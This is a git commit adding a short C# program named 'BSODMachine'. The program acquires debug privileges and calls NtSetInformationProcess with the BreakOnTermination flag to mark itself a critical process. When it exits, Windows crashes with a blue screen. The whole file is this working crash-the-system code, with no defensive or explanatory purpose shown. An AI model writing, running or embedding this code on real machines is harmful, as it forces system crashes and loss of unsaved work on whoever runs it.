13d316e628f4685f6d3d283e998bfa11eb3530c2
georgbretterebner <73408300+georgbretterebner@users.noreply.github.com>
2022-01-21 10:51:30 +0100

    Added Project Files

---
+++ BSODMachine/Program.cs
@@ -0,0 +1,20 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class CriticalProcess
+{
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+
+    static void Main(string[] args)
+    {
+        int isCritical = 1;  // we want this to be a Critical Process
+        int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
+
+        Process.EnterDebugMode();  //acquire Debug Privileges
+
+        // setting the BreakOnTermination = 1 for the current process
+        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+    }
+}
